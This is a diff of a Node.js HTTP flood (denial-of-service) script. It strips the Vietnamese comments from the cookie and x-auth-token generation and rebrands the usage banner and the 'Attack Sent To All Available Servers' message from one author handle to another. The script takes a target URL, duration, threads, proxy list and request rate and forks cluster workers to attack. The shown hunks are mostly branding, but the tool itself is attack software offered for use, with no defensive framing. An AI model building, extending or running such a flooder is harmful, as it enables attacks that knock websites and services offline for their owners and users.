@@ -11,26 +11,14 @@ randstr = require('randomstring');
 const crypto = require('crypto');
 const currentTime = new Date();
 const httpTime = currentTime.toUTCString();
-  
-
-// T?o m?t chu?i ng?u nhi�n �? s? d?ng l�m gi� tr? cookie
 const randomString = crypto.randomBytes(20).toString('hex');
-
-// T?o m?t kh�a b� m?t ng?u nhi�n �? s? d?ng cho vi?c m? h�a cookie
 const secretKey = crypto.randomBytes(32);
-
-// T?o �?i t�?ng cipher �? m? h�a cookie b?ng thu?t to�n AES-256-CBC
 var ciphe = crypto.createCipheriv('aes-256-cbc', secretKey, crypto.randomBytes(16));
-
-// M? h�a chu?i ng?u nhi�n v� l�u k?t qu? v�o bi?n encrypted
 let encrypted = ciphe.update(randomString, 'utf8', 'hex');
 encrypted += ciphe.final('hex');
-
-// T?o cookie v?i gi� tr? �? m? h�a
 const cookieValue = encrypted;
-
-const bytes = crypto.randomBytes(16); // T?o 16 byte ng?u nhi�n
-const xAuthToken = bytes.toString('hex'); // Chuy?n �?i th�nh chu?i hex
+const bytes = crypto.randomBytes(16);
+const xAuthToken = bytes.toString('hex');
 
 
 
@@ -1277,7 +1265,7 @@ const rps = process.argv[6];
 
 // Validate input
 if (!target || !time || !thread || !proxyFile || !rps) {
-  console.log('BROWSER-FLOOD'.bgBlue)
+  console.log('HTTP - D4XG | @prifxz'.bgRed)
     console.error(`Example: node ${process.argv[1]} url time thread proxy.txt rate delay`.rainbow);
   process.exit(1);
 }
@@ -1319,9 +1307,8 @@ if (cluster.isMaster) {
 
 
      console.clear()
-      console.log(`Attack Sent Successfully .... !!`.bgRed),
-      console.log(`Methods By PHNM` .bgMagenta)
-      console.log(`BUY SCRIPT DMS ME TELE @phnminh` .green) 
+      console.log(`Attack Sent To All Available Servers .... !!`.bgRed),
+      console.log(`Methods By @prifxz` .bgRed)
   for (let _ of Array.from({length: thread})) {
   cluster.fork();
 }
